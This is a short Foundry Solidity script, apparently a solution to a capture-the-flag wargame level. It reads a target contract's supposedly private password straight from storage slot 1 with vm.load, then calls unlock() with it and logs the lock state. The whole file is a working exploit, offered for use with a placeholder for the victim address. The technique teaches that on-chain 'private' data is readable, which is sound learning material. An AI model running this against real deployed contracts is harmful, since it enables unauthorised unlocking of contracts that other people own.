//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script, console2} from "forge-std/Script.sol";

contract AttackScript is Script {

	address victim = /* Your instance address */ ;	

	function run() public {
	bytes32 password = vm.load(victim, bytes32(uint256(1))); //1 because this is the slot of the password variable
	vm.startBroadcast();
	victim.call(abi.encodeWithSignature("unlock(bytes32)", password));
	vm.stopBroadcast();
	(, bytes memory data) = victim.staticcall(abi.encodeWithSignature("locked()"));
	console2.log(abi.decode(data, (uint256)));
}
}
